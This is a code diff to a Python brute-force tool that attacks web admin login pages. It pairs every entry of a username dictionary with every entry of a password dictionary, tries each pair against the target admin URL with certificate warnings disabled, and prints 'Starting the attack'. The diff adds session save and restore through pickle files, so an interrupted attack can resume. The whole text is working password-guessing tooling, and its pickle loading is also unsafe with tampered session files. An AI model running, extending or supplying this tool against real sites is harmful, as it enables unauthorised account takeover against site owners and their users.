@@ -6,6 +6,8 @@ from bs4 import BeautifulSoup
 import logging
 import sys
 from colorama import Back, Fore, Style
+import pickle
+import os
 
 
 
@@ -49,6 +51,8 @@ parser.add_argument("-userdict",help="dictionnary file for user list.",required=
 parser.add_argument("-passwdict",help="dictionnary file for password.",required=True)
 parser.add_argument("-onlygood",help="Show only good attempts.",action='store_true', default=False, required=False)
 parser.add_argument("-l",help="Log to a file.",required=False)
+parser.add_argument("-restore",help="restore from a .session file, by default domain name is used to save the session.",required=False)
+
 
 # Show banner
 banner()
@@ -64,9 +68,9 @@ userdict = args.userdict
 passwords = args.passwdict
 onlygood = args.onlygood
 logfile = args.l
+rsession = args.restore
 
 admin_url = scheme + '://' + domain + uri
-
 
 # Disable warnings for certs
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -88,18 +92,6 @@ if logfile:
 
 
 
-# Opening dict files
-try:
-    USERS = open(userdict,'r')
-except:
-    print("cannot open users file :",userdict)
-    exit(1)
-
-try:
-    PASSWORDS = open(passwords,'r')
-except:
-    print("cannot open password file :",userdict)
-    exit(1)
 
 
 
@@ -160,19 +152,92 @@ def Authenticate(admin_url,username,password):
             logger.error(msg)
     
 
+def CredentialsStuffer(userdict,passwords):
+    userlist = []
+    passwordlist = []
+    database = []
     
+    # Opening dict files
+    try:
+        USERS = open(userdict,'r')
+    except:
+        print("cannot open users file :",userdict)
+        exit(1)
+    try:
+        PASSWORDS = open(passwords,'r')
+    except:
+        print("cannot open password file :",userdict)
+        exit(1)
+    
+    # Extracting users passwords from files
+    for word in USERS.readlines():
+        userlist.append(word.strip())
+    
+    for word in PASSWORDS.readlines():
+        passwordlist.append(word.strip())
+    
+    # Creating the database
+    for user in userlist:
+        for password in passwordlist:
+            database.append([user,password])
+    return database
+    
+
+def SaveSession(mylist,domain):
+    sessionfile = '.'+domain+'.session'
+    
+    if len(mylist) == 0:
+        print("Cleaning session file.")
+        os.remove(sessionfile)
+    else:
+        try:
+            with open(sessionfile,"wb") as f:
+                pickle.dump(mylist,f)
+        except:
+            print("cannot save the session file into",sessionfile,"aborting :'(")
+            exit(1)
+
+
+def RestoreSession(domain):
+    sessionfile = '.'+domain+'.session'
+
+    with open(sessionfile,'rb') as f:
+        try:
+            restored = pickle.load(f)
+        except:
+            print("cannot restore session, file is corrupt :'(")
+            exit(1)
+    
+    return restored
+
+
+
+
 
 
 # Main
 
+# Restore session if needed
+if rsession:
+    print("Trying to restore the previous session !")
+    try:
+        Credentials = RestoreSession(domain)
+    except:
+        print("Cannot restore your session file: ",rsession)
+        exit(1)
+else:
+    # Generate all credentials
+    Credentials = CredentialsStuffer(userdict,passwords)
 
-userlist = list(set([(word.strip()) for word in USERS.readlines()]))
-passwordlist = list(set([(word.strip()) for word in PASSWORDS.readlines()]))
 
 print("Starting the attack against",admin_url,"...")
 
-for user in userlist:
-    for password in passwordlist:
-        Authenticate(admin_url,user,password)
+while Credentials:
+    record = Credentials.pop(0)
+    login = record[0]
+    password = record[1]
+    Authenticate(admin_url,login,password)
+    SaveSession(Credentials,domain)
 
 
+print("Attack is finished !")
